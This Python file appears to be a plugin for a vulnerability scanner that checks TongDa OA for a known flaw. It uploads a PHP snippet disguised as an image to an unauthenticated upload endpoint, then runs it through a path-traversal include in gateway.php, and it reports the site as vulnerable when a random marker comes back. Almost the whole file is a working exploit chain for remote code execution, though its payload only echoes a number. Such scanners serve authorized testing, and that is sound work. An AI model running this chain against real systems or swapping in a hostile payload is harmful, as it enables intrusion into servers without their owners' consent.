#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import random
from aiohttp import FormData
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                upload_url = self.base_url + "/ispirit/im/upload.php"
                include_url = self.base_url + "/ispirit/interface/gateway.php"
                random_str = str(random.randint(100000, 999999))
                form = FormData()
                form.add_field("P", "123")
                form.add_field("Filename", "php.jpg")
                form.add_field("DEST_UID", "1")
                form.add_field("UPLOAD_MODE", "2")
                form.add_field('ATTACHMENT', "<?php echo '%s' ?>" %random_str, filename='php.jpg',content_type='text/plain')
                async with session.post(url=upload_url, data=form) as res:
                    if res:
                        text = await res.text()
                        path = text[text.find('@') + 1:text.rfind('|')].replace("_", "\/").replace("|", ".")
                        file_path = "/general/../../attach/im/" + path
                        include_data = {"json": "{\"url\":\"" + file_path + "\"}"}
                        async with session.post(url=include_url, data=include_data) as include_res:
                            if include_res:
                                include_text = await include_res.text()
                                if random_str in include_text:
                                    yield include_url
